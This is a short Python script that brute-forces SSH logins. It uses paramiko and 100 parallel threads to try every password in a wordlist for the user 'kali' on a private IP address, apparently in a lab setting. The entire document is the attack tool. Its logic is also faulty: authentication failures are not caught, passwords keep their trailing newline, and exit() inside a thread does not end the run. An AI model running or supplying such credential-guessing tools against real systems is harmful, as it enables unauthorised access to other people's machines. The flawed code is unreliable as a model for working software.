import paramiko
from concurrent.futures import ThreadPoolExecutor


def attempt(ip, pwd):
    policy = paramiko.client.AutoAddPolicy
    with paramiko.SSHClient() as client:
        client.set_missing_host_key_policy(policy)
        try:
            client.connect(ip, username='kali', password=pwd)
        except paramiko.ssh_exception.NoValidConnectionsError:
            print("Connection failed")
        else:
            print(f"Password found: {pwd}")
            exit(0)


ip = '192.168.1.223'
# passwords = ['toor', 'admin']
passwords = open('ssh_passwords.txt', 'r')


with ThreadPoolExecutor(max_workers=100) as ex:
    for pwd in passwords:
        print(f"Trying password: {pwd.strip()}")
        ex.submit(attempt, ip, pwd)
